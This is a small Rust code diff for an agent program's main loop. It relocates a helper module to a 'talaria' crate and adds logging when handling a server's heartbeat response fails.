@@ -1,11 +1,10 @@
 pub mod agent;
 pub mod harpe;
-pub mod helper;
 pub mod network;
 
 use agent::AgentContext;
-use helper::*;
 use std::time::Duration;
+use talaria::helper::*;
 use tokio::time::sleep;
 
 // FIXME:
@@ -27,7 +26,10 @@ async fn main() {
     // Main agent loop
     loop {
         match network::send_heartbeat(&mut agent).await {
-            Ok(instruction) => network::handle_response(&mut agent, instruction).await,
+            Ok(instruction) => match network::handle_response(&mut agent, instruction).await {
+                Ok(_) => {}
+                Err(err) => devlog!("Failed to handle response\n {:?}", err),
+            },
             Err(err) => devlog!("Failed to communicate with server\n {:?}", err),
         }
 
